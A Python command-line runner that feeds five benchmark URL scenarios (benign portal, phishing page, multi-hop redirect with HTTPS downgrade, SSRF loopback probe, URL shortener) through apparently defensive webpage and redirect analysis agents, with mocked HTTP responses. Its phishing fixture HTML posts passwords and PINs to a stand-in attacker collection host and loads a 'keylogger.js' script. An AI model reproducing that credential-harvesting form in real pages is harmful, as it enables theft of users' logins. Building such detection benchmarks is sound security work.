"""
CLI Runner: Run Webpage Analysis Agent & Behaviour Analysis Agent with Different URLs.

Supports:
1. Built-in diverse real-world cybersecurity scenarios (Legitimate, Phishing, Open Redirect, SSRF).
2. Custom URL testing via command line arguments.

Usage:
  # Run all benchmark URL scenarios:
  python -m src.run_agents

  # Run on a custom URL:
  python -m src.run_agents --url "https://login.example.com"
"""

import argparse
import json
import sys
from unittest.mock import MagicMock
import requests

from src.webpage_agent import analyze_webpage
from src.behaviour_agent import analyze_behaviour
from src.correlation_agent import correlate_evidence


def create_mock_response(status_code: int, url: str, location: str | None = None) -> requests.Response:
    resp = MagicMock(spec=requests.Response)
    resp.status_code = status_code
    resp.url = url
    resp.headers = {"Location": location} if location else {}
    return resp


# ---------------------------------------------------------------------------
# Benchmark Scenarios with Different URLs and Profiles
# ---------------------------------------------------------------------------
SCENARIOS = [
    {
        "name": "Scenario 1: Legitimate Enterprise Portal (Benign)",
        "url": "https://secure.acme-corp.example/portal/login",
        "description": "Legitimate corporate portal with same-domain relative login submission and HTTPS.",
        "html": """
        <!DOCTYPE html>
        <html>
        <head><title>Acme Corp - SSO Login</title></head>
        <body>
            <h2>Sign in to Acme Cloud</h2>
            <form action="/auth/verify" method="POST">
                <input type="text" name="user" placeholder="Email" required />
                <input type="password" name="password" placeholder="Password" required />
                <input type="hidden" name="csrf" value="tok_98471a" />
                <button type="submit">Log In</button>
            </form>
            <script src="/static/js/main.js"></script>
        </body>
        </html>
        """,
        "navigation_hops": [
            (200, "https://secure.acme-corp.example/portal/login", None)
        ]
    },
    {
        "name": "Scenario 2: Credential Harvesting Phishing Page (Malicious)",
        "url": "http://verify-account-security-alert.net:8080/login.html",
        "description": "Insecure HTTP phishing page submitting credentials to an external drop server.",
        "html": """
        <!DOCTYPE html>
        <html>
        <head><title>Urgent: Account Suspension Warning</title></head>
        <body>
            <h2>Your account has been locked. Verify immediately.</h2>
            <form action="http://collector-dropzone.attacker-cloud.example/steal" method="POST">
                <input type="text" name="account_id" />
                <input type="password" name="secret_pin" />
                <input type="hidden" name="session_id" value="phish_8829" />
                <input type="submit" value="Unlock Account" />
            </form>
            <iframe src="http://deceptive-overlay.attacker-cloud.example/tracker"></iframe>
            <script src="http://thirdparty-scripts.attacker-cloud.example/keylogger.js"></script>
        </body>
        </html>
        """,
        "navigation_hops": [
            (200, "http://verify-account-security-alert.net:8080/login.html", None)
        ]
    },
    {
        "name": "Scenario 3: Multi-Hop Redirect with Protocol Downgrade (High Risk)",
        "url": "https://promo-tracker.tracklink.example/offer?id=992",
        "description": "Navigation begins on HTTPS, jumps across 2 intermediate domains, downgrades to insecure HTTP.",
        "html": """
        <!DOCTYPE html>
        <html>
        <head><title>Claim Your Special Award</title></head>
        <body>
            <h1>Congratulations!</h1>
            <p>Confirm your account identity to claim:</p>
            <form action="" method="POST">
                <input type="password" name="banking_passcode" />
                <input type="submit" value="Claim" />
            </form>
        </body>
        </html>
        """,
        "navigation_hops": [
            (302, "https://promo-tracker.tracklink.example/offer?id=992", "https://middle-ad-hub.example/click"),
            (301, "https://middle-ad-hub.example/click", "http://unsecured-login.fakebank.example/account"),
            (200, "http://unsecured-login.fakebank.example/account", None)
        ]
    },
    {
        "name": "Scenario 4: Intranet Probe / SSRF Attempt (Blocked)",
        "url": "http://127.0.0.1:8080/internal/cluster/metrics",
        "description": "Attempt to probe private internal loopback/cloud metadata services.",
        "html": "<html><body>Internal diagnostics</body></html>",
        "navigation_hops": []  # Blocked before network connection
    },
    {
        "name": "Scenario 5: Legitimate URL Shortener to Documentation (Ambiguous / Resolved)",
        "url": "https://short.dev/react-docs",
        "description": "URL shortener hops across domain to benign technical documentation page without credential inputs.",
        "html": """
        <!DOCTYPE html>
        <html>
        <head><title>Developer API Documentation</title></head>
        <body>
            <header><h1>React Component API Guide</h1></header>
            <p>Read the documentation below:</p>
            <a href="https://github.com/facebook/react">Official Repo</a>
            <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript">MDN Web Docs</a>
        </body>
        </html>
        """,
        "navigation_hops": [
            (302, "https://short.dev/react-docs", "https://docs.react-portal.example/guide"),
            (200, "https://docs.react-portal.example/guide", None)
        ]
    }
]


def run_agents_on_target(
    url: str,
    html: str,
    navigation_hops: list[tuple[int, str, str | None]] | None = None
) -> dict:
    """
    Execute Webpage Analysis Agent, Behaviour Analysis Agent, and Evidence Correlation.
    """
    # 1. Run Webpage Analysis Agent
    webpage_result = analyze_webpage(html=html, page_url=url)

    # 2. Run Behaviour Analysis Agent
    mock_session = None
    if navigation_hops is not None:
        mock_session = MagicMock(spec=requests.Session)
        responses = [
            create_mock_response(code, hop_url, loc)
            for code, hop_url, loc in navigation_hops
        ]
        mock_session.get.side_effect = responses

    behaviour_result = analyze_behaviour(url=url, session=mock_session)

    # 3. Evidence Correlation
    correlation_report = correlate_evidence(
        url_result=None,
        webpage_result=webpage_result,
        behaviour_result=behaviour_result,
        target_url=url
    )

    return {
        "url": url,
        "webpage": webpage_result,
        "behaviour": behaviour_result,
        "correlation": correlation_report
    }


def print_agent_report(scenario_num: int, name: str, description: str, data: dict):
    url = data["url"]
    web = data["webpage"]
    beh = data["behaviour"]
    corr = data["correlation"]

    print("=" * 80)
    print(f"[{scenario_num}] {name}")
    print("=" * 80)
    print(f"Target URL:         {url}")
    print(f"Description:        {description}")
    print()

    # --- Agent 1: Webpage Analysis ---
    print("  [Agent 1: Webpage Analysis Agent]")
    print(f"    - Status:                  {web.get('status', 'completed')}")
    print(f"    - Total Forms:             {web.get('forms_count', 0)}")
    print(f"    - Password Fields:         {web.get('password_fields_count', 0)}")
    print(f"    - Hidden Fields:           {web.get('hidden_fields_count', 0)}")
    print(f"    - External Iframes:        {web.get('iframes_count', 0)}")
    print(f"    - External Scripts:        {web.get('external_scripts_count', 0)}")

    if web.get("suspicious_form_actions"):
        print("    - Suspicious Form Actions:")
        for action in web["suspicious_form_actions"]:
            print(f"        * External target: {action.get('destination')} (Method: {action.get('method', 'GET').upper()})")

    if web.get("credential_forms"):
        print("    - Credential Forms:")
        for cf in web["credential_forms"]:
            ext_flag = "EXTERNAL DESTINATION (HIGH RISK)" if cf.get("is_external") else "Internal / Relative"
            print(f"        * Form Action: '{cf.get('action')}' -> Destination: {cf.get('destination')} [{ext_flag}]")

    if web.get("missing_form_actions"):
        print(f"    - Missing / Empty Actions: {len(web['missing_form_actions'])}")

    print()

    # --- Agent 2: Behaviour Analysis ---
    print("  [Agent 2: Behaviour Analysis Agent]")
    print(f"    - Status:                  {beh.get('status')}")
    print(f"    - Final Reached URL:       {beh.get('final_url')}")
    print(f"    - Redirect Count (Hops):   {beh.get('redirect_count')}")
    print(f"    - Domain Changes:          {len(beh.get('domain_changes', []))}")
    print(f"    - Protocol Downgrade:      {'YES (HTTPS -> HTTP)' if beh.get('has_protocol_downgrade') else 'No'}")
    print(f"    - Circular Loop Detected:  {'YES' if beh.get('has_loop') else 'No'}")

    if beh.get("redirect_chain"):
        print("    - Redirect Hop Path:")
        for hop in beh["redirect_chain"]:
            next_dest = f" -> Redirects to: {hop.get('destination')}" if hop.get('destination') else ""
            status_disp = f"HTTP {hop.get('status_code')}" if hop.get('status_code') else "BLOCKED / NO_RESPONSE"
            print(f"        * [Hop {hop.get('hop')}] {status_disp} | {hop.get('url')}{next_dest}")

    print()

    # --- Evidence Correlation Synthesis ---
    risk_color = corr.get("overall_risk", "low").upper()
    print("  [Synthesized Correlation & Risk Assessment]")
    print(f"    - Overall Risk Level:      {risk_color}")
    print(f"    - Triage Risk Score:       {corr.get('risk_score', 0.0):.2f} / 1.00")
    print(f"    - Confidence:              {corr.get('confidence', '').upper()}")
    print(f"    - Summary:                 {corr.get('summary')}")

    if corr.get("evidence"):
        print("    - Observed Evidence Items:")
        for ev in corr["evidence"]:
            print(f"        * [{ev.get('source_agent')}] {ev.get('observation')}")

    if corr.get("supporting_signals"):
        print("    - Corroborating Signals (Cross-Agent Confirmation):")
        for sig in corr["supporting_signals"]:
            print(f"        [+] {sig.get('description')}")

    if corr.get("conflicting_signals"):
        print("    - Conflicting Signals Resolved:")
        for c_sig in corr["conflicting_signals"]:
            print(f"        [!] {c_sig.get('description')}")

    print()


def main():
    parser = argparse.ArgumentParser(
        description="Run Webpage Analysis Agent & Behaviour Analysis Agent with Different URLs"
    )
    parser.add_argument("--url", help="Target URL to analyze", default=None)
    parser.add_argument("--html", help="HTML string or path to HTML file", default=None)
    args = parser.parse_args()

    print("\n" + "=" * 80)
    print(" RUNNING WEBPAGE & BEHAVIOUR AGENTS ACROSS MULTIPLE URL PROFILES")
    print("=" * 80 + "\n")

    if args.url:
        # Custom URL mode
        html_content = args.html or "<html><body><h1>Custom Test</h1></body></html>"
        if args.html:
            import os
            if os.path.exists(args.html):
                with open(args.html, "r", encoding="utf-8") as f:
                    html_content = f.read()

        data = run_agents_on_target(args.url, html_content)
        print_agent_report(1, "Custom Target URL", "User-specified URL evaluation", data)
    else:
        # Benchmark suite mode
        for i, scenario in enumerate(SCENARIOS, 1):
            data = run_agents_on_target(
                url=scenario["url"],
                html=scenario["html"],
                navigation_hops=scenario["navigation_hops"]
            )
            print_agent_report(i, scenario["name"], scenario["description"], data)

    print("=" * 80)
    print(" EXECUTION COMPLETE: Both agents evaluated successfully across all URLs.")
    print("=" * 80 + "\n")


if __name__ == "__main__":
    main()
